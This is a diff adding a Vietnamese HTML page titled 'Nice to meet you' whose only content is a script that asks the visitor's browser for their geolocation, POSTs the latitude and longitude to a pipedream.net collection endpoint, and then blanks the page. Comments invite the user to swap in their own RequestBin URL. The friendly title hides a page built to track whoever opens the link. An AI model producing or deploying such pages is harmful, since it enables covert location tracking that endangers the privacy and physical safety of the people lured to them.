@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rất vui được biết bạn</title>
+</head>
+<body>
+        <script>
+        // Thay thế bằng URL RequestBin của bạn
+        const endpoint = 'https://eofb417dghhmwib.m.pipedream.net';  // <-- THAY BẰNG URL CỦA BẠN
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error);
+        } else {
+            alert('Trình duyệt không hỗ trợ lấy vị trí.');
+        }
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const data = { latitude: lat, longitude: lon };
+
+            fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.body.innerHTML = '';
+                } else {
+                    alert('Lỗi');
+                }
+            })
+            .catch(error => {
+                alert('Lỗi: ' + error.message);
+            });
+        }
+
+        function error(err) {
+            alert('Lỗi lấy' + err.message);
+        }
+    </script>
+</body>
+</html>
